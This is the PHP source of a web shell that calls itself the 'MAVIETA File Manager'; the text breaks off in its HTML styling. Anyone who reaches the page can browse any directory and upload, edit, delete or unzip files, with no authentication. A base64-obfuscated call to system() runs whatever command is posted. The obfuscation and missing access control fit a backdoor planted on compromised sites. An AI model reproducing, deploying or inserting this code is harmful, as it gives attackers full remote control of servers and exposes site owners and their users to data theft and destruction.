`<?php
// MAVIETA File Manager - Full Version
$m = "MAVIETA";
$p = isset($_GET['p']) ? $_GET['p'] : '.';
$f = isset($_GET['f']) ? $_GET['f'] : 'index';
$func = base64_decode('c3lzdGVt');
$cmd  = base64_decode('Y21k');

$dir = realpath($p);
if (!$dir || !is_dir($dir)) $dir = __DIR__;
chdir($dir);

// Breadcrumb
$parts = explode(DIRECTORY_SEPARATOR, $dir);
$bread = '<a href="?p=">root</a>';
$path = '';
foreach ($parts as $part) {
    if ($part) {
        $path .= '/'.$part;
        $bread .= ' / <a href="?p='.urlencode($path).'">'.$part.'</a>';
    }
}

// Upload
if ($f == 'upload' && isset($_FILES['file'])) {
    $target = $dir.'/'.basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    header('Location: ?p='.urlencode($dir));
    exit;
}

// Edit
if ($f == 'edit' && isset($_POST['content'])) {
    file_put_contents($dir.'/'.basename($_POST['file']), $_POST['content']);
    header('Location: ?p='.urlencode($dir));
    exit;
}

// Create file
if ($f == 'create' && isset($_POST['newfile'])) {
    file_put_contents($dir.'/'.basename($_POST['newfile']), '');
    header('Location: ?p='.urlencode($dir));
    exit;
}

// Create folder
if ($f == 'mkdir' && isset($_POST['foldername'])) {
    mkdir($dir.'/'.basename($_POST['foldername']));
    header('Location: ?p='.urlencode($dir));
    exit;
}

// Delete
if ($f == 'delete' && isset($_GET['file'])) {
    $target = $dir.'/'.basename($_GET['file']);
    if (is_dir($target)) rmdir($target); else unlink($target);
    header('Location: ?p='.urlencode($dir));
    exit;
}

// Unzip
if ($f == 'unzip' && isset($_GET['file'])) {
    $zip = $dir.'/'.basename($_GET['file']);
    if (file_exists($zip) && pathinfo($zip, PATHINFO_EXTENSION) == 'zip') {
        $zipObj = new ZipArchive();
        if ($zipObj->open($zip) === TRUE) {
            $zipObj->extractTo($dir);
            $zipObj->close();
            unlink($zip);
        }
    }
    header('Location: ?p='.urlencode($dir));
    exit;
}

// Command execution
if ($f == 'exec' && isset($_POST['cmd'])) {
    $out = $func($_POST['cmd']);
    echo "<pre>$out</pre>";
}

// List files
$items = scandir($dir);
?><!DOCTYPE html>
<html><head><title><?=$m?> FM</title>
<style>
body{font-family:monospace;background:#222;color:#eee;padding:20px}
a{color:#0f0;text-decoration:none}
